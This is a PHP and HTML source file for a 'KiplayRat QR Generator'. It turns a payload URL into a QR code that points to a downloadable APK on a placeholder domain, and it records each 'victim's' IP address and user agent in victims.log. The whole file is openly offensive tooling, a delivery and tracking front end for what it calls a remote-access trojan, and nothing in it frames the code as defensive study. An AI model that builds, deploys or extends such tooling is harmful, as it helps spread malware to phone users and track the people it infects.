<?php
require 'vendor/autoload.php'; // QR Code library

use Endroid\QrCode\QrCode;
use Endroid\QrCode\Writer\PngWriter;

if ($_POST['generate_qr']) {
    $payload = $_POST['payload'];
    $qrCode = QrCode::create($payload)
        ->setSize(300)
        ->setMargin(10);
    
    $writer = new PngWriter();
    $result = $writer->write($qrCode);
    
    // Generate unique download link
    $downloadLink = "https://your-domain.com/download/apk_" . uniqid() . ".apk";
    
    // Log victim
    logVictim($payload, $_SERVER['REMOTE_ADDR']);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>KiplayRat QR Generator</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-dark text-light">
    <div class="container mt-5">
        <h1 class="text-center mb-4">🚀 KiplayRat QR Generator</h1>
        <form method="POST" class="card p-4 bg-secondary">
            <div class="mb-3">
                <label>Payload URL:</label>
                <input type="url" name="payload" class="form-control" required 
                       placeholder="https://your-domain.com/install.php">
            </div>
            <button type="submit" name="generate_qr" class="btn btn-success w-100">
                Generate QR Code
            </button>
        </form>
    </div>
</body>
</html>

<?php
function logVictim($payload, $ip) {
    $log = [
        'timestamp' => date('Y-m-d H:i:s'),
        'payload' => $payload,
        'ip' => $ip,
        'user_agent' => $_SERVER['HTTP_USER_AGENT']
    ];
    file_put_contents('victims.log', json_encode($log) . PHP_EOL, FILE_APPEND);
}
?>
